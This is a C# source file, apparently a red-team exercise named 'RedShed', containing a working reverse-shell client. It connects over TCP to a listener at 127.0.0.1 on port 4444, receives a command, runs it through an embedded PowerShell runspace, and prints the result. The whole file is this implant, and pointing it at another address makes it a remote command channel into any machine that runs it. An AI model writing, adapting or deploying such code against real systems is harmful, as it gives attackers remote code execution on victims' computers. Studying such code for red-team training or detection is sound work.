
using System; // provides Array, Console
using System.Collections.ObjectModel; // provides Collection<T> 
using System.IO; // provides StringWriter
using System.Net; // provides IPAddress, IPEndPoint
using System.Net.Sockets; // provides Socket, SocketType
using System.Text; // provides Encoding
using System.Management.Automation; // provides PowerShell, PSObject
using System.Management.Automation.Runspaces;

namespace RedShed {
  class Client {
    public Socket socket;
    public int BUFFER_SIZE;
    
    public string Execute(string command) {
      string output = "";
      RunspaceConfiguration rc = RunspaceConfiguration.Create();
      Runspace r = RunspaceFactory.CreateRunspace(rc);
      r.Open();
      PowerShell ps = PowerShell.Create();
      ps.Runspace = r;
      ps.AddScript(command);
      StringWriter sw = new StringWriter();
      Collection<PSObject> po = ps.Invoke();
      foreach(PSObject p in po) {
        sw.WriteLine(p.ToString());
      }
      output = sw.ToString();
      return output;
    }

    public Client() {
      socket = new Socket(IPAddress.Any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
      BUFFER_SIZE = 2048; 
    }

    static void Main() {
      Client client = new Client();
      IPAddress address = IPAddress.Parse("127.0.0.1");
      int port = 4444;
      IPEndPoint endpoint = new IPEndPoint(address, port);
      client.socket.Connect(endpoint);
      byte[] bytes = new byte[client.BUFFER_SIZE];
      Array.Clear(bytes, 0, bytes.Length); // clear the buffer, from first to last byte
      client.socket.Receive(bytes);
      string command = Encoding.ASCII.GetString(bytes).TrimEnd('\0');
      Console.WriteLine("{0}", command);
      string output = client.Execute(command);
      Console.WriteLine("{0}", output);
      client.socket.Close();
    }
  }
}